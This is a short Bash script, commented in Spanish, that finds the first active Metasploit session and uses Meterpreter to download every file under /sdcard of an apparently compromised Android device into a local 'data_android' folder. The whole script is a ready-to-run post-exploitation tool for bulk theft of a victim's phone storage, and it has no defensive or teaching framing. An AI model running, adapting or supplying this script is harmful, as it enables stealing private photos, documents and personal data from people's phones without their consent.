#!/bin/bash

# Directorio de destino en tu máquina
DEST_DIR="$HOME/Descargas"

# Verificar si el directorio de destino existe
if [ ! -d "$DEST_DIR" ]; then
    DEST_DIR="$HOME/Downloads"
fi

# Crear el directorio de destino si no existe
mkdir -p "$DEST_DIR/data_android"

# Obtener el primer ID de sesión disponible
SESSION_ID=$(msfconsole -q -x "sessions -l; exit" | grep -oP '^\s*\d+' | head -n 1)

# Verificar si se encontró una sesión
if [ -z "$SESSION_ID" ]; then
    echo -e "\e[31mNo se encontró ninguna sesión activa.\e[0m"
    exit 1
fi

# Conectarse a la sesión de Meterpreter y descargar los archivos
msfconsole -x "sessions -i $SESSION_ID; cd /sdcard; download * $DEST_DIR; exit;"